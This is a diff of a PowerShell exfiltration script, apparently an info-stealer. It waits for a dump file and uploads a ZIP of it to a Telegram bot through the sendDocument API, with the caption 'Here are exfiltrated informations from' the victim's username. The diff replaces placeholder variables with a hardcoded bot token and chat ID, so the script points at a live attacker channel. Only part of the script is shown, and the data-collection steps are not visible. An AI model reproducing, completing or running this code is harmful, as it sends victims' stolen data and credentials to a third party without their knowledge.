@@ -61,7 +61,7 @@ while (!(Test-Path "$dumpFile")) {
 }
 
 # Telegram configuration
-$uri = "https://api.telegram.org/bot$Token/sendDocument"
+$uri = "https://api.telegram.org/bot9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90/sendDocument"
 $caption = "Here are exfiltrated informations from $env:USERNAME"
 
 # Check if the file exists before sending
@@ -82,7 +82,7 @@ if (-not ("System.Net.Http.HttpClient" -as [type])) {
 # Create HTTP client
 $client = New-Object System.Net.Http.HttpClient
 $content = New-Object System.Net.Http.MultipartFormDataContent
-$content.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
+$content.Add((New-Object System.Net.Http.StringContent(1859879540)), "chat_id")
 $content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
 
 # Attach the ZIP file
